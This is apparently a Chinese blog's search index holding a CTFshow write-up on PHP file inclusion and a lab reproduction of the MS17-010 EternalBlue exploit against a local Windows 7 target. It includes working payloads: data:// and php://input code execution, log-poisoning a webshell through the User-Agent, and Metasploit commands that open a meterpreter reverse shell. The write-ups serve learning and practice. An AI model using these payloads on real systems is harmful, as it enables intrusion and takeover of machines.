<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>开始</title>
    <url>/2022/02/26/article-title/</url>
    <content><![CDATA[<p>经历了两天的搭建，不断的摸索和百度谷歌搜索，自己的博客也总算是搭建成功了，虽然还很菜，但也总算是跨出了第一步。</p>
]]></content>
      <categories>
        <category>搭建</category>
      </categories>
      <tags>
        <tag>运行中</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF_SHOW之web入门部分wp</title>
    <url>/2022/02/26/jian-web1/</url>
    <content><![CDATA[<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查看目录</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现 include 包含函数，选择使用 data 伪协议 data://text/plain,构造 payload：?file=data://text/plain,<?php phpinfo();?>成功出现 phpinfo()页面</p>
<p><img src="/images/web_78a.png"></p>
<p>然后输如查询目录的指令，发现有 flag.php 文件：?file=data://text/plain,<?php system("ls");?></p>
<p><img src="/images/web_78b.png">]</p>
<p>使用 tac 命令读取文件，成功读取 flag:ctfshow{7bc171e1-06c8-4e6c-8e13-33585ea3d0be}</p>
<h4 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
if(isset($_GET[&#39;file&#39;]))&#123;
    $file &#x3D; $_GET[&#39;file&#39;];
    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
    include($file);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现这次对 php 进行了过滤，但可以使用 php 短标记<?=?>和?占位符进行读出</p>
<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;system(&quot;tac flag.???&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功读出 flag：ctfshow{e8c8a34c-8e08-4b8e-92ac-6387a53ddb92}</p>
<h4 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
if(isset($_GET[&#39;file&#39;]))&#123;
    $file &#x3D; $_GET[&#39;file&#39;];
    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
    include($file);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这次发现还对 data 进行了替换，原本想想使用的是：</p>
<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;Php:&#x2F;&#x2F;input
post: &lt;?php system(&quot;ls&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>但不知为什么没有显示出来，所以查看了 hint，给的提示是访问 nginx 和 apache 下的日志文件，getshell 的方法，payload 如下：</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;489ea2b8-3fb5-4cc6-b9d6-7fc5608c320b.challenge.ctf.show&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 bp 抓包，将🐎写再UA头里</p>
<p><img src="/images/web_80a.png"></p>
<p><img src="/images/web_80b.png"></p>
<p><img src="/images/web_80c.png"></p>
<h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
if(isset($_GET[&#39;file&#39;]))&#123;
    $file &#x3D; $_GET[&#39;file&#39;];
    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);
    include($file);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现这次还将冒号给过滤了，不过却可以继续访问 var/log/nginx/access.log 日志文件进行传🐎,得到flag</p>
<p><img src="/images/web_81.png"></p>
<h4 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h4><p>条件竞争，限制了并发，先做后面的。</p>
]]></content>
      <categories>
        <category>ctf_show</category>
      </categories>
      <tags>
        <tag>web入门_文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>ms17_010漏洞复现</title>
    <url>/2022/03/06/ms17-010-fu-xian/</url>
    <content><![CDATA[<h6 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h6><p>永恒之蓝（Eternalblue）是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。</p>
<p>原理：</p>
<p>通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，通过恶意代码扫描并攻击开放445文件共享端口的Windows主机，只要用户主机在线，即可通过该漏洞，控制用户的主机。</p>
<p>测试环境：</p>
<p>攻击机：kali</p>
<p>靶机：Windows7 (ip：192.168.102.128；在被渗透过程中需全程关闭防火墙)</p>
<p>复现过程：</p>
<p>1.先使用nmap对目标ip进行端口扫描，查看445端口是否有开放</p>
<p><img src="/images/ms17_010a.png"></p>
<p>2.进入msfconsole，搜索ms17-010</p>
<p><img src="/images/ms17_010b.png"></p>
<p>有两个工具可以使用，auxiliary/scanner/smb/smb_ms17_010是扫描模块；exploit/windows/smb/ms17_010_eternalblue是渗透模块；一般先进行扫描，再进行渗透。</p>
<p>3.使用扫描模块对靶机进行扫描</p>
<pre class="line-numbers language-none"><code class="language-none">进入扫描模块
use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010
设置目标ip
set rhosts 192.168.102.128
开始扫描
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/images/ms17_010c.png"></p>
<p>可以发现目标ip确实存在漏洞风险</p>
<p>4.使用渗透模块对目标进行渗透</p>
<pre class="line-numbers language-none"><code class="language-none">进入渗透模块
use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue
查看当前模块所需参数
show options
设置目标ip
set rhosts 192.168.102.128
开始渗透
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/images/ms17_010d.png"></p>
<p>5.在执行完run后，开启了一个reverse tcp监听器来监听本地的4444端口，运行成功后会进入一个meterpreter会话，可以通过此会话来执行系统命令、提权、获取敏感信息等；输入shell后即可切换到目标主机的windows shell</p>
<p><img src="/images/ms17_010f.png"></p>
<p>对靶机执行相关命令，发现成功执行。</p>
<p><img src="/images/ms17_010g.png"></p>
<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>以上便是ms17_010漏洞的复现了，过程相对简单，但却获得了极大的系统权限，由此可见系统自动更新的重要性了。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>ms17_010漏洞</tag>
      </tags>
  </entry>
</search>
